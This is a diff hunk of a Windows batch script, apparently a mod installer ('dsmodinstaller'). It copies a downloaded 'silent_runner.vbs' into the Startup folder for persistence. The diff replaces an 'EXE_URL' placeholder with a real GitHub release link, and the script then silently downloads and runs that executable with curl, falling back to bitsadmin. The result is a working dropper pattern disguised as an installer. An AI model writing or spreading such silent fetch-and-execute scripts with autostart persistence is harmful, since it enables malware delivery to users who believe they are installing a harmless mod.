@@ -20,8 +20,8 @@ curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubuserc
 :: Copy silent script to Startup folder
 copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
 
-:: Download and run external EXE (replace EXE_URL later)
-curl -L -o "%appdata%\dsmodinstaller\external.exe" "EXE_URL" || bitsadmin /transfer job /download /priority high "EXE_URL" "%appdata%\dsmodinstaller\external.exe"
+:: Download and run external EXE
+curl -L -o "%appdata%\dsmodinstaller\external.exe" "https://github.com/6686-repos/shelter-installer/releases/download/1.0.0/install-shelter.exe" || bitsadmin /transfer job /download /priority high "EXE_URL" "%appdata%\dsmodinstaller\external.exe"
 start "" "%appdata%\dsmodinstaller\external.exe"
 
 :: Run silent script silently
